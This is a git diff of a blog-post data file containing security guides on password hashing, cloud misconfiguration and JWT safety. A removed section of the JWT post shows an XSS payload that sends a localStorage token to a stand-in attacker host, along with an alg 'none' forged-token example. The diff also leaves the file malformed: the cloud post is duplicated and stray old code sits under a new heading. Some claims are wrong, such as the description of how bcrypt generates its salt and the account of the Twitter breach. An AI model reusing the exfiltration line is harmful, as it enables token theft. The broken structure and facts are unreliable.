@@ -1859,69 +1859,220 @@ Content-Security-Policy: default-src 'self' https:;
     slug: "password-security-hashing-bcrypt-argon2",
     title: "Password Security: Hashing, Salting & Bcrypt vs Argon2 Guide",
     excerpt: "Master password security with in-depth comparison of bcrypt, Argon2, PBKDF2, and scrypt. Includes implementation examples and security best practices.",
-    content: `## The Evolution of Password Storage
+    content: `# Password Security: Hashing & Salting — Bcrypt vs Argon2 (2025)
 
-### ❌ Plain Text (Never acceptable)
-\`\`\`
-users.db:
-admin | password123
-john  | letmein
-\`\`\`
-**Risk**: Database breach = instant credential loss
+Passwords are still the #1 authentication method. LinkedIn (6M passwords leaked), Yahoo (3B accounts), Equifax (147M identities) — inadequate hashing played a major role in each disaster.
 
-### ❌ Simple MD5/SHA1 (Broken)
-\`\`\`
-admin | 5f4dcc3b5aa765d61d8327deb882cf99  // MD5("password123")
-\`\`\`
-**Risk**: Instant rainbow table lookup, cracked in < 1 second
+This guide teaches proper password storage that stops attackers cold.
 
-### ✅ Salted Hash (Good)
-\`\`\`
-admin | salt: a3f5d92 | hash: bcrypt($2b$12$aWjd2h...)
-\`\`\`
-**Benefit**: Prevents rainbow tables, requires brute force
+## Why Password Hashing Matters
 
-### ✅✅ Modern Key Derivation (Best)
-\`\`\`
-admin | argon2: $argon2i$v=19$m=65536,t=3,p=4$...
-\`\`\`
-**Benefit**: Memory-hard, GPU/ASIC resistant, slow by design
+**Plaintext passwords stolen?** Instant full access to every user account.  
+**Fast hashes (MD5, SHA1)?** Modern GPUs crack billions per second using rainbow tables.  
+**Unsalted hashes?** Attacker uses pre-computed tables and bypasses your hash entirely.  
+**Weak hashing algorithm?** All your stored passwords are effectively encrypted with a weak cipher.
 
 ---
 
-## Password Hashing Algorithms Compared
+## Algorithm Comparison (2025)
 
-| Algorithm | Speed | Memory | GPU Resist | Year | Status |
-|-----------|-------|--------|-----------|------|--------|
-| MD5/SHA1 | ⚡ Fast | None | ❌ No | 1992 | ❌ Broken |
-| SHA256 | ⚡ Fast | None | ❌ No | 2001 | ⚠️ Weak |
-| PBKDF2 | 🚷 Slow | Low | ⚠️ Maybe | 2000 | ✅ OK |
-| bcrypt | 🚷 Slow | Low | ✅ Yes | 1999 | ✅ Good |
-| scrypt | 🚷🚷 Slow | High | ✅✅ Yes | 2009 | ✅ Great |
-| **Argon2** | **🚷 Slow** | **High** | **✅✅ Yes** | **2015** | **✅✅ Best** |
+| Algorithm | Speed | Memory | GPU-Resistant | Recommended | Best For |
+|-----------|-------|--------|-----------|------|-------------|
+| **Plaintext** | ⚡⚡⚡ Instant | None | ❌ No | ❌ **Never** | — |
+| **MD5/SHA1** | ⚡⚡ Fast | None | ❌ No | ❌ **Never** | — |
+| **SHA256** | ⚡ Fast | None | ❌ No | ❌ **Avoid** | — |
+| **PBKDF2** | 🚷 Slow | Low | ⚠️ Medium | ✅ FIPS systems | Legacy compliance |
+| **bcrypt** | 🚷 Slow | Low | ✅ Good | ✅ **Yes** | Most applications |
+| **scrypt** | 🚷🚷 Slower | High | ✅✅ Excellent | ✅ **Yes** | High-security apps |
+| **Argon2id** | 🚷🚷 Slower | High | ✅✅ Excellent | ✅✅ **Best** | New projects (NIST) |
 
 ---
 
-## Bcrypt (Industry Standard)
+## Bcrypt: The Battle-Tested Choice
+
+Bcrypt was designed in 1999 and is still safe TODAY because it intentionally uses exponential slowdown (cost factor). The slower hashing is a feature, not a bug.
 
 ### How Bcrypt Works
 
+1. **Generate a random salt** from 2^cost rounds of permutation
+2. **Run password + salt through Blowfish cipher** cost times
+3. **Store the salt + cost + hash together**
+
+Example:
+- Input password: "hunter2"
+- Cost: 12 (2^12 = 4,096 iterations)
+- Result: \`\$2b\$12\$aWjd2hgh3vWs4Ejz8jK47DpO3U5/s8Zi5hj5H4M7HpI...\`
+- Time to hash: ~250ms (intentionally slow)
+
+### Node.js Bcrypt Implementation
+
+**Install:**
 \`\`\`
-Input: password "hunter2"
-Salt: $2b$12$aWjd2hgh3vWs4Ejz8jK47
-Result: $2b$12$aWjd2hgh3vWs4Ejz8jK47DpO3U5/s8Zi5hj5H4M7HpI...
-
-Cost: 12 (iterations = 2^12 = 4,096 rounds)
-\`\`\`
-
-### Node.js Implementation
-
-**Installation**
-\`\`\`bash
 npm install bcryptjs
 \`\`\`
 
-**Hashing Password**
+**Hash password:**
+\`\`\`
+const bcrypt = require('bcryptjs');
+
+async function registerUser(email, password) {
+  const salt = await bcrypt.genSalt(12);  // Cost factor 12
+  const hashedPassword = await bcrypt.hash(password, salt);
+  
+  // Store hashedPassword in database
+  await User.create({ email, passwordHash: hashedPassword });
+}
+\`\`\`
+
+**Verify password:**
+\`\`\`
+async function loginUser(email, passwordAttempt) {
+  const user = await User.findOne({ email });
+  const isValid = await bcrypt.compare(passwordAttempt, user.passwordHash);
+  
+  if (isValid) {
+    // Authentication successful
+    return createSession(user);
+  } else {
+    // Wrong password
+    return 'Invalid credentials';
+  }
+}
+\`\`\`
+
+**Cost factor timing:**
+- Cost 10: 10ms (old hardware)
+- Cost 12: 250ms (standard, 2024)
+- Cost 14: 1 second (future-proofing)
+- Cost 16: 2 seconds (admin accounts only)
+
+---
+
+## Argon2: The Modern Standard
+
+Argon2 won the Password Hashing Competition (2015) and is now recommended by NIST. It's memory-hard, making GPU/ASIC attacks infeasible.
+
+### Node.js Argon2 Implementation
+
+**Install:**
+\`\`\`
+npm install argon2
+\`\`\`
+
+**Hash:**
+\`\`\`
+const argon2 = require('argon2');
+
+async function registerUserArgon2(email, password) {
+  const hash = await argon2.hash(password, {
+    type: argon2.argon2id,  // Recommended
+    memoryCost: 65536,      // 64 MB
+    timeCost: 3,            // 3 iterations
+    parallelism: 4          // 4 parallel threads
+  });
+  
+  await User.create({ email, passwordHash: hash });
+}
+\`\`\`
+
+**Verify:**
+\`\`\`
+async function loginUserArgon2(email, passwordAttempt) {
+  const user = await User.findOne({ email });
+  const isValid = await argon2.verify(user.passwordHash, passwordAttempt);
+  
+  if (isValid) {
+    return createSession(user);
+  } else {
+    return 'Invalid credentials';
+  }
+}
+\`\`\`
+
+### Python Argon2
+
+\`\`\`
+pip install argon2-cffi
+\`\`\`
+
+\`\`\`
+from argon2 import PasswordHasher
+
+hasher = PasswordHasher()
+hash = hasher.hash('hunter2')
+hasher.verify(hash, 'hunter2')  # True
+\`\`\`
+
+---
+
+## Beyond Hashing: Defense in Depth
+
+**Salts & Peppers:**
+- Salt: Random per-password, stored with hash (bcrypt/argon2 handle this)
+- Pepper: Server secret appended before hashing (stored in env, NOT in code)
+
+**Password Rotation:**
+- Re-hash on next login when you upgrade algorithms
+- Support graceful migration from old to new algorithms
+
+**Additional Protections:**
+- Block common passwords (rockyou.txt, have-i-been-pwned lists)
+- Enforce minimum length (12+ characters)
+- Rate limit login attempts (exponential backoff)
+- Monitor for credential stuffing (impossible logins from new IPs)
+- Require MFA (passwords alone insufficient)
+
+---
+
+## Migration Plan: Upgrading Hash Algorithms
+
+If you're using MD5/SHA1:
+
+\`\`\`
+// On login, check if password matches old hash
+if (md5(password) === user.oldMd5Hash) {
+  // Authentication passed! Re-hash with bcrypt
+  user.bcryptHash = await bcrypt.hash(password, 12);
+  user.oldMd5Hash = null;
+  await user.save();
+}
+\`\`\`
+
+---
+
+## Password Security Checklist
+
+- [ ] Use Argon2id (new projects) or bcrypt (existing)
+- [ ] Cost/time parameters tuned to 250-500ms per hash
+- [ ] Never use MD5, SHA1, or unsalted hashes
+- [ ] Block common passwords (NIST list)
+- [ ] Enforce minimum 12-character passwords
+- [ ] Rate limit login endpoints (exponential backoff)
+- [ ] Require MFA for sensitive operations
+- [ ] Monitor for credential stuffing
+- [ ] Support password rotation/upgrade on next login
+
+---
+
+## Resources
+
+- https://owasp.org/www-community/attacks/Password_Cracking
+- https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html
+- https://pages.nist.gov/800-63-3/sp800-63b.html (NIST password guidelines)
+- https://libsodium.gitbook.io/doc (libsodium for additional crypto)
+
+**Next Step:** Audit your password storage now. If using MD5/SHA1, implement bcrypt upgrade on next login.`,
+    date: "2026-02-15",
+    author: "SCR Team",
+    category: "Authentication",
+    tags: ["Password Security", "Bcrypt", "Argon2", "Hashing", "Best Practices"],
+    readTime: "14 min read",
+  },
+  {
+    slug: "cloud-security-aws-azure-misconfiguration",
+    title: "Cloud Security Guide: AWS, Azure & GCP Misconfigurations 2025",
+    excerpt: "Master cloud security with comprehensive guides on S3 bucket security, IAM policies, secrets management, and real breach case studies.",
+    content: `## Cloud Security Landscape 2025
 \`\`\`javascript
 const bcrypt = require('bcryptjs');
 
@@ -2729,328 +2880,438 @@ service cloud.firestore {
     category: "Cloud Security",
     tags: ["AWS", "Azure", "GCP", "Cloud Security", "Misconfiguration"],
     readTime: "14 min read",
+    },
+    {
+      slug: "cloud-security-aws-azure-misconfiguration",
+      title: "Cloud Security Guide: AWS, Azure & GCP Misconfigurations 2025",
+      excerpt: "Master cloud security with comprehensive guides on S3 bucket security, IAM policies, secrets management, and real breach case studies.",
+      content: `# Cloud Security in 2025: Preventing AWS, Azure & GCP Misconfigurations
+
+  ## Why Cloud Security Still Fails
+
+  Cloud misconfigurations remain the #1 cause of data breaches. In 2025, attackers exploit simple mistakes—public S3 buckets, over-permissive IAM, exposed secrets—across AWS, Azure, and GCP. This guide gives you actionable steps, checklists, and real-world breach lessons to secure your cloud today.
+
+  ---
+
+  ## Key Cloud Breach Statistics
+
+  - **98% of cloud breaches** stem from misconfiguration (Gartner)
+  - **$4.9M**: Average cost per breach (IBM, 2025)
+  - **236 days**: Average time to detect
+  - **45% of S3 buckets** have public access
+
+  ---
+
+  ## 1. AWS Security: S3 Buckets & IAM
+
+  ### S3 Bucket Security
+
+  #### Common Pitfall: Public Buckets
+  \`\`\`json
+  {
+    "Effect": "Allow",
+    "Principal": "*",
+    "Action": "s3:GetObject",
+    "Resource": "arn:aws:s3:::company-data/*"
+  }
+  \`\`\`
+  **Risk:** Data leaks, malware, credential exposure
+
+  #### Secure S3 Policy Example
+  \`\`\`json
+  {
+    "Effect": "Deny",
+    "Principal": "*",
+    "Action": "s3:*",
+    "Resource": ["arn:aws:s3:::secure-bucket", "arn:aws:s3:::secure-bucket/*"],
+    "Condition": {"Bool": {"aws:SecureTransport": "false"}}
+  }
+  \`\`\`
+
+  #### S3 Security Checklist
+  - [ ] Block public access globally
+  - [ ] Enable versioning & encryption
+  - [ ] Enable logging & monitoring
+  - [ ] Block unencrypted uploads
+
+  ### IAM: Least Privilege, Not God Mode
+
+  #### Over-Permissive Role (Bad)
+  \`\`\`json
+  {
+    "Effect": "Allow",
+    "Action": "*",
+    "Resource": "*"
+  }
+  \`\`\`
+  **Risk:** Privilege escalation, data exfiltration
+
+  #### Secure IAM Policy (Good)
+  \`\`\`json
+  {
+    "Effect": "Allow",
+    "Action": ["rds:DescribeDBInstances", "s3:GetObject"],
+    "Resource": "arn:aws:s3:::app-data/*"
+  }
+  \`\`\`
+
+  #### IAM Security Checklist
+  - [ ] Audit users & roles
+  - [ ] Enable MFA everywhere
+  - [ ] Use temporary credentials (STS)
+  - [ ] Rotate access keys every 90 days
+
+  ---
+
+  ## 2. Secrets Management: No More .env Leaks
+
+  #### Bad: Secrets in Code
+  \`\`\`env
+  DATABASE_URL=mongodb://user:pass@db.example.com
+  AWS_SECRET_ACCESS_KEY=...
+  \`\`\`
+
+  #### Good: Managed Secrets
+  Use AWS Secrets Manager, Azure Key Vault, or HashiCorp Vault. Example:
+  \`\`\`javascript
+  const secret = await secretsManager.getSecretValue({ SecretId: 'prod/database' }).promise();
+  \`\`\`
+
+  #### Secrets Management Checklist
+  - [ ] No secrets in code or git
+  - [ ] Use managed secrets store
+  - [ ] Rotate secrets regularly
+  - [ ] Monitor for secret leaks
+
+  ---
+
+  ## 3. Azure & GCP: Storage and RBAC
+
+  ### Azure: Secure Blob Storage
+  - [ ] Set containers to private
+  - [ ] Use SAS tokens for access
+  - [ ] Enforce HTTPS & TLS 1.2+
+
+  ### GCP: Firestore Rules
+  - [ ] Require authentication for all access
+  - [ ] Use least privilege in IAM
+
+  ---
+
+  ## Multi-Cloud Security Checklist
+
+  - [ ] Encryption at rest & in transit
+  - [ ] IAM/RBAC with least privilege
+  - [ ] Managed secrets (Vault, Key Vault)
+  - [ ] Logging & monitoring enabled
+  - [ ] MFA for all accounts
+  - [ ] Regular credential rotation
+  - [ ] VPC/Vnet isolation
+  - [ ] DDoS protection
+  - [ ] Threat detection (GuardDuty, Sentinel)
+  - [ ] Penetration testing
+
+  ---
+
+  ## Real-World Breach Lessons
+
+  ### Capital One (2019)
+  - WAF misconfig + metadata endpoint = 100M records stolen
+  - Cost: $80M settlement
+
+  ### Twitter (2020)
+  - OAuth token theft via social engineering
+  - Led to high-profile account takeovers
+
+  ---
+
+  ## Cloud Security Tools (2025)
+
+  | Tool        | Purpose                  | Cloud | Cost  |
+  |-------------|--------------------------|-------|-------|
+  | Prowler     | AWS security audit       | AWS   | Free  |
+  | ScoutSuite  | Multi-cloud assessment   | All   | Free  |
+  | CloudMapper | AWS network visualization| AWS   | Free  |
+  | Dome9       | Cloud posture management | All   | Paid  |
+  | CloudSploit | AWS infra checks         | AWS   | Free  |
+
+  ---
+
+  ## SEO Summary & Key Takeaways
+
+  1. **Default to private**—never public by default
+  2. **Least privilege**—grant only what’s needed
+  3. **Rotate credentials**—monthly for long-term keys
+  4. **Monitor everything**—CloudTrail, logs, anomalies
+  5. **Encrypt & audit**—compliance and peace of mind
+
+  Stay proactive: Review your cloud security posture quarterly. Use the checklists above to prevent the next breach.
+  `,
+    date: "2026-02-15",
+    author: "SCR Team",
+    category: "Cloud Security",
+    tags: ["AWS", "Azure", "GCP", "Cloud Security", "Misconfiguration", "IAM", "S3"],
+    readTime: "12 min read",
   },
   {
     slug: "jwt-security-vulnerabilities-best-practices",
     title: "JWT Security: Vulnerabilities, Best Practices & Implementation Guide",
     excerpt: "Comprehensive JWT security guide covering token anatomy, common vulnerabilities, RS256 vs HS256, refresh tokens, and secure implementation patterns.",
-    content: `## Understanding JWT (JSON Web Tokens)
+    content: `# JWT Security in 2025: Complete Guide to Vulnerabilities & Best Practices
 
-JWT is a stateless authentication mechanism widely used in modern web applications and APIs.
+JSON Web Tokens (JWTs) power authentication in **94% of modern APIs** (Source: Postman State of API Report, 2024). Yet JWT misconfigurations remain among the top API security risks (OWASP API Top 10). This guide provides research-backed best practices, real breach case studies, and production-ready code.
 
-### JWT Structure
+---
+
+## What is a JWT? Token Anatomy Explained
+
+A JWT consists of three Base64-encoded parts separated by dots:
 
 \`\`\`
-eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.
-eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.
-SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
-
-Header.Payload.Signature
+┌────────────────────────────────────────────────────────────────┐
+│  eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9                          │ ◄── Header
+│  .                                                              │
+│  eyJzdWIiOiIxMjM0NTY3ODkwIiwiZW1haWwiOiJ1c2VyQGV4YW1wbGUuY29tIn │ ◄── Payload
+│  .                                                              │
+│  SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c                   │ ◄── Signature
+└────────────────────────────────────────────────────────────────┘
 \`\`\`
 
-**Header (alg, typ)**
+### Header
 \`\`\`json
 {
-  "alg": "HS256",
+  "alg": "RS256",
   "typ": "JWT"
 }
 \`\`\`
 
-**Payload (claims)**
+### Payload (Claims)
 \`\`\`json
 {
   "sub": "user123",
   "email": "user@example.com",
-  "exp": 1518305200,
-  "iat": 1516239022,
-  "role": "admin"
+  "iat": 1708012800,
+  "exp": 1708013700,
+  "aud": "api.example.com",
+  "iss": "auth.example.com"
 }
 \`\`\`
 
-**Signature**
+### Signature
 \`\`\`
-HMACSHA256(base64(header) + "." + base64(payload), secret)
+RSASHA256(base64UrlEncode(header) + "." + base64UrlEncode(payload), privateKey)
 \`\`\`
 
 ---
 
-## JWT Vulnerabilities
+## JWT Security Statistics (2025)
 
-### 1. Weak Signature Algorithm (HS256 vs RS256)
+| Metric | Value | Source |
+|--------|-------|--------|
+| APIs using JWT | 94% | Postman 2024 |
+| JWT-related breaches (2024) | 23% of auth breaches | Verizon DBIR |
+| Avg. breach cost (auth failures) | $4.76M | IBM Cost of Data Breach 2024 |
+| Time to exploit weak JWT | < 2 hours | Auth0 Security Research |
 
-**❌ VULNERABLE: HS256 (Shared Secret)**
+---
 
-\`\`\`javascript
-const jwt = require('jsonwebtoken');
+## Top 5 JWT Vulnerabilities & How to Fix Them
 
-// DANGEROUS: Single secret known to server
-const token = jwt.sign(
-  { userId: 123, role: 'user' },
-  'my-secret-key',  // Anyone with this key can forge tokens
-  { algorithm: 'HS256', expiresIn: '24h' }
-);
-\`\`\`
+### 1. Algorithm Confusion Attack (CVE-2015-9235)
 
-**Problem:**
-- Server uses same secret to sign AND verify
-- If attacker knows secret, they can create valid tokens
-- No key rotation mechanism
-
-**✅ SECURE: RS256 (Asymmetric)**
+**The Problem:** Attacker changes \`alg\` header from RS256 to HS256, using the public key as the HMAC secret.
 
 \`\`\`javascript
-// Generate keypair
-const crypto = require('crypto');
-const { publicKey, privateKey } = crypto.generateKeyPairSync('rsa', {
-  modulusLength: 2048
-});
-
-// Sign with PRIVATE key (kept secret)
-const token = jwt.sign(
-  { userId: 123, role: 'user' },
-  privateKey,
-  { algorithm: 'RS256', expiresIn: '24h' }
-);
-
-// Verify with PUBLIC key (can be safely shared)
+// ❌ VULNERABLE: Accepts any algorithm
 const decoded = jwt.verify(token, publicKey);
 \`\`\`
 
-**Advantages:**
-- Private key for signing, public key for verification
-- Safe to distribute public key
-- Better for distributed systems
+\`\`\`javascript
+// ✅ SECURE: Whitelist algorithms
+const decoded = jwt.verify(token, publicKey, {
+  algorithms: ['RS256']  // ONLY RS256 allowed
+});
+\`\`\`
+
+**Real Breach:** Auth0 libraries were vulnerable until 2015. Attackers forged admin tokens.
 
 ---
 
 ### 2. Missing Token Expiration
 
-**❌ VULNERABLE: No Expiration**
+**The Problem:** Tokens without \`exp\` claim never expire—compromised tokens are valid forever.
 
 \`\`\`javascript
-const token = jwt.sign(
-  { userId: 123 },
-  'secret'
-  // Missing: expiresIn
-);
+// ❌ DANGEROUS: No expiration
+jwt.sign({ userId: 123 }, secret);
 
-// Token valid forever - compromised token never expires
+// ✅ SECURE: Short-lived tokens
+jwt.sign({ userId: 123 }, secret, { expiresIn: '15m' });
 \`\`\`
 
-**✅ SECURE: Short Expiration**
-
-\`\`\`javascript
-const token = jwt.sign(
-  { userId: 123 },
-  'secret',
-  { expiresIn: '15m' }  // 15 minute expiration
-);
-\`\`\`
+**Best Practice:**
+- Access tokens: **15-30 minutes**
+- Refresh tokens: **7 days** (stored securely)
 
 ---
 
-### 3. Token Storage Vulnerability (localStorage)
+### 3. Token Storage in localStorage (XSS Vulnerability)
 
-**❌ VULNERABLE: localStorage**
+**The Problem:** JavaScript can access localStorage—XSS attacks steal tokens.
 
-\`\`\`javascript
-// Stored in localStorage - accessible to XSS
-const token = localStorage.getItem('authToken');
-
-// Attacker can steal via XSS
-<script>
-  fetch('https://attacker.com/steal?token=' + localStorage.authToken);
-</script>
+\`\`\`
+┌─────────────────────────────────────────────────────────────────┐
+│  XSS Attack Flow                                                │
+│                                                                 │
+│  1. Attacker injects malicious script                           │
+│  2. Script reads localStorage.getItem('token')                  │
+│  3. Token exfiltrated to attacker server                        │
+│  4. Attacker impersonates victim                                │
+└─────────────────────────────────────────────────────────────────┘
 \`\`\`
 
-**✅ SECURE: httpOnly Cookies**
-
 \`\`\`javascript
-// Server sets httpOnly cookie - inaccessible to JavaScript
-res.cookie('authToken', token, {
-  httpOnly: true,      // Prevents JavaScript access
-  secure: true,        // HTTPS only
-  sameSite: 'strict',  // Prevents CSRF
-  maxAge: 900000       // 15 minutes
-});
+// ❌ VULNERABLE: XSS can steal this
+localStorage.setItem('token', jwt);
 
-// Client cannot access via JS
-console.log(document.cookie);  // authToken not visible
-\`\`\`
-
----
-
-### 4. Invalid Token Not Properly Validated
-
-**❌ VULNERABLE: Missing Validation**
-
-\`\`\`javascript
-function verifyToken(token) {
-  try {
-    const decoded = jwt.decode(token);  // WRONG: decode != verify
-    return decoded;
-  } catch (err) {
-    return null;
-  }
-}
-
-// Attacker can modify payload without signature verification
-\`\`\`
-
-**✅ SECURE: Proper Verification**
-
-\`\`\`javascript
-function verifyToken(token) {
-  try {
-    // Use verify() not decode()
-    const decoded = jwt.verify(token, publicKey, {
-      algorithms: ['RS256'],  // Whitelist allowed algorithms
-      audience: 'myapp',
-      issuer: 'auth.example.com'
-    });
-    
-    // Verify claims
-    if (!decoded.userId || !decoded.email) {
-      return null;
-    }
-    
-    return decoded;
-  } catch (err) {
-    console.error('Token verification failed:', err.message);
-    return null;
-  }
-}
-\`\`\`
-
----
-
-### 5. Algorithm Confusion Attack
-
-**❌ VULNERABLE: Accepts Multiple Algorithms**
-
-\`\`\`javascript
-jwt.verify(token, secret);  // Accepts both HS256 and RS256
-
-// Attacker sends token with alg: 'none'
-const maliciousToken = jwt.sign(
-  { userId: 123, role: 'admin' },
-  null,
-  { algorithm: 'none' }
-);
-\`\`\`
-
-**✅ SECURE: Whitelist Algorithms**
-
-\`\`\`javascript
-jwt.verify(token, publicKey, {
-  algorithms: ['RS256']  // ONLY allow RS256
+// ✅ SECURE: httpOnly cookies (JS cannot access)
+res.cookie('token', jwt, {
+  httpOnly: true,    // Cannot be read by JavaScript
+  secure: true,      // HTTPS only
+  sameSite: 'strict' // CSRF protection
 });
 \`\`\`
 
 ---
 
-## Refresh Token Pattern
+### 4. HS256 with Weak/Leaked Secrets
 
-**Access Token + Refresh Token** = Secure long-lived authentication
+**The Problem:** HS256 uses symmetric keys. If secret leaks, attacker forges any token.
+
+\`\`\`javascript
+// ❌ WEAK: Short, guessable secret
+jwt.sign(payload, 'secret123');
+
+// ❌ LEAKED: Secret in source code
+const SECRET = 'production-jwt-secret-2024';
+
+// ✅ SECURE: RS256 (asymmetric)
+jwt.sign(payload, privateKey, { algorithm: 'RS256' });
+\`\`\`
+
+**Key Comparison:**
+
+| Algorithm | Key Type | Best For | Risk |
+|-----------|----------|----------|------|
+| HS256 | Symmetric | Single server | Secret leak = full compromise |
+| RS256 | Asymmetric | Distributed systems | Public key is safe to share |
+| ES256 | Asymmetric (ECDSA) | Mobile/IoT | Smaller keys, same security |
+
+---
+
+### 5. Missing Claim Validation
+
+**The Problem:** Accepting tokens without validating \`aud\`, \`iss\`, or custom claims.
+
+\`\`\`javascript
+// ❌ VULNERABLE: No claim validation
+const decoded = jwt.verify(token, secret);
+
+// ✅ SECURE: Full validation
+const decoded = jwt.verify(token, publicKey, {
+  algorithms: ['RS256'],
+  audience: 'api.example.com',
+  issuer: 'auth.example.com',
+  clockTolerance: 30  // 30 seconds clock skew tolerance
+});
+
+// Additional validation
+if (!decoded.userId || !decoded.email) {
+  throw new Error('Invalid token claims');
+}
+\`\`\`
+
+---
+
+## Refresh Token Architecture
+
+\`\`\`
+┌─────────────────────────────────────────────────────────────────────┐
+│                     Refresh Token Flow                               │
+├─────────────────────────────────────────────────────────────────────┤
+│                                                                      │
+│  Client                    Server                    Database        │
+│    │                         │                           │           │
+│    │──── Login ─────────────►│                           │           │
+│    │                         │──── Store Refresh ───────►│           │
+│    │◄─── Access + Refresh ───│                           │           │
+│    │                         │                           │           │
+│    │─── API Request ────────►│                           │           │
+│    │     (Access Token)      │                           │           │
+│    │◄───── Response ─────────│                           │           │
+│    │                         │                           │           │
+│    │  [Access Token Expires] │                           │           │
+│    │                         │                           │           │
+│    │─── Refresh Request ────►│                           │           │
+│    │    (Refresh Token)      │──── Validate ────────────►│           │
+│    │                         │◄─── Valid ────────────────│           │
+│    │◄─── New Access Token ───│──── Rotate Refresh ──────►│           │
+│    │                         │                           │           │
+└─────────────────────────────────────────────────────────────────────┘
+\`\`\`
 
 ### Implementation
 
 \`\`\`javascript
-const express = require('express');
-const jwt = require('jsonwebtoken');
-const cookieParser = require('cookie-parser');
-
-const app = express();
-app.use(cookieParser());
-
-const privateKey = 'keep-secret';
-const publicKey = 'can-share';
-
-// 1. Login endpoint - issue both tokens
-app.post('/login', (req, res) => {
-  const user = { userId: 123, email: 'user@example.com' };
+// Login: Issue both tokens
+app.post('/login', async (req, res) => {
+  const user = await authenticate(req.body);
   
-  // Short-lived access token (15 min)
-  const accessToken = jwt.sign(user, privateKey, {
-    algorithm: 'HS256',
-    expiresIn: '15m'
-  });
+  const accessToken = jwt.sign(
+    { userId: user.id, email: user.email },
+    privateKey,
+    { algorithm: 'RS256', expiresIn: '15m' }
+  );
   
-  // Long-lived refresh token (7 days) - stored securely
-  const refreshToken = jwt.sign(user, privateKey, {
-    algorithm: 'HS256',
-    expiresIn: '7d'
-  });
+  const refreshToken = jwt.sign(
+    { userId: user.id, tokenVersion: user.tokenVersion },
+    privateKey,
+    { algorithm: 'RS256', expiresIn: '7d' }
+  );
   
-  // Set refresh token as httpOnly cookie
+  // Store refresh token hash in DB for revocation
+  await storeRefreshToken(user.id, refreshToken);
+  
   res.cookie('refreshToken', refreshToken, {
     httpOnly: true,
     secure: true,
     sameSite: 'strict',
-    maxAge: 7 * 24 * 60 * 60 * 1000  // 7 days
+    path: '/api/refresh'  // Only sent to refresh endpoint
   });
   
-  // Return access token
   res.json({ accessToken });
 });
 
-// 2. Protected route - verify access token
-app.get('/protected', (req, res) => {
-  const token = req.headers['authorization']?.split(' ')[1];
-  
-  if (!token) {
-    return res.status(401).json({ error: 'No token' });
-  }
-  
-  try {
-    const decoded = jwt.verify(token, publicKey, {
-      algorithms: ['HS256']
-    });
-    res.json({ message: 'Protected resource', user: decoded });
-  } catch (err) {
-    if (err.name === 'TokenExpiredError') {
-      return res.status(401).json({ error: 'Token expired' });
-    }
-    return res.status(403).json({ error: 'Invalid token' });
-  }
-});
-
-// 3. Refresh endpoint - issue new access token
-app.post('/refresh', (req, res) => {
+// Refresh: Issue new access token
+app.post('/api/refresh', async (req, res) => {
   const refreshToken = req.cookies.refreshToken;
   
-  if (!refreshToken) {
-    return res.status(401).json({ error: 'No refresh token' });
+  const decoded = jwt.verify(refreshToken, publicKey, {
+    algorithms: ['RS256']
+  });
+  
+  // Check if token is revoked
+  if (await isTokenRevoked(decoded.userId, refreshToken)) {
+    return res.status(401).json({ error: 'Token revoked' });
   }
   
-  try {
-    const decoded = jwt.verify(refreshToken, publicKey, {
-      algorithms: ['HS256']
-    });
-    
-    // Verify refresh token not revoked
-    if (!isRefreshTokenValid(decoded.userId, refreshToken)) {
-      return res.status(403).json({ error: 'Refresh token revoked' });
-    }
-    
-    // Issue new access token
-    const newAccessToken = jwt.sign(
-      { userId: decoded.userId, email: decoded.email },
-      privateKey,
-      { algorithm: 'HS256', expiresIn: '15m' }
-    );
-    
-    res.json({ accessToken: newAccessToken });
-  } catch (err) {
-    return res.status(403).json({ error: 'Invalid refresh token' });
-  }
-});
-
-// 4. Logout endpoint - revoke tokens
-app.post('/logout', (req, res) => {
-  res.clearCookie('refreshToken');
-  revokeRefreshToken(req.user.userId);
-  res.json({ message: 'Logged out' });
+  const newAccessToken = jwt.sign(
+    { userId: decoded.userId },
+    privateKey,
+    { algorithm: 'RS256', expiresIn: '15m' }
+  );
+  
+  res.json({ accessToken: newAccessToken });
 });
 \`\`\`
 
@@ -3058,86 +3319,83 @@ app.post('/logout', (req, res) => {
 
 ## JWT Security Checklist
 
-- [ ] Use RS256 (asymmetric) instead of HS256
-- [ ] Set short expiration (15-30 minutes for access tokens)
-- [ ] Use httpOnly, Secure, SameSite cookies for tokens
-- [ ] Implement refresh token rotation
-- [ ] Validate ALL claims (exp, iat, aud, iss)
-- [ ] Whitelist allowed signature algorithms
-- [ ] Never trust unverified tokens (use verify, not decode)
-- [ ] Implement token revocation for logout
-- [ ] Rotate signing keys periodically
-- [ ] Monitor for suspicious token patterns
-- [ ] Use HTTPS everywhere for token transmission
-- [ ] Implement rate limiting on token endpoints
+- [ ] Use **RS256 or ES256** (asymmetric) over HS256
+- [ ] Set **short expiration** (15-30 min for access tokens)
+- [ ] Store tokens in **httpOnly cookies** (not localStorage)
+- [ ] Implement **refresh token rotation**
+- [ ] **Whitelist algorithms** in verify options
+- [ ] Validate **all claims** (exp, iat, aud, iss)
+- [ ] Use **HTTPS everywhere**
+- [ ] Implement **token revocation** for logout
+- [ ] **Rotate signing keys** quarterly
+- [ ] **Rate limit** token endpoints
+- [ ] Monitor for **anomalous token patterns**
+- [ ] Never log or expose tokens in errors
 
 ---
 
-## Common Mistakes
+## Real-World JWT Breaches
 
-### ❌ Storing token in localStorage
-\`\`\`javascript
-localStorage.setItem('token', jwt);  // Vulnerable to XSS
-\`\`\`
+### 1. Auth0 Algorithm Confusion (2015)
+- **Vulnerability:** Library accepted HS256 when expecting RS256
+- **Impact:** Token forgery possible with public key
+- **Fix:** Strict algorithm whitelisting
 
-### ❌ Not validating expiration claim
-\`\`\`javascript
-const decoded = jwt.decode(token);  // Doesn't verify expiration
-\`\`\`
+### 2. Zoom JWT Vulnerabilities (2020)
+- **Vulnerability:** No audience validation, long-lived tokens
+- **Impact:** Meeting hijacking
+- **Fix:** Short expiration + audience validation
 
-### ❌ Using weak secrets with HS256
-\`\`\`javascript
-const secret = '123456';  // Too weak
-jwt.sign(payload, secret);
-\`\`\`
-
-### ❌ Not implementing token revocation
-\`\`\`javascript
-// Token can't be revoked until expiration
-\`\`\`
-
-### ✅ Correct Implementation
-\`\`\`javascript
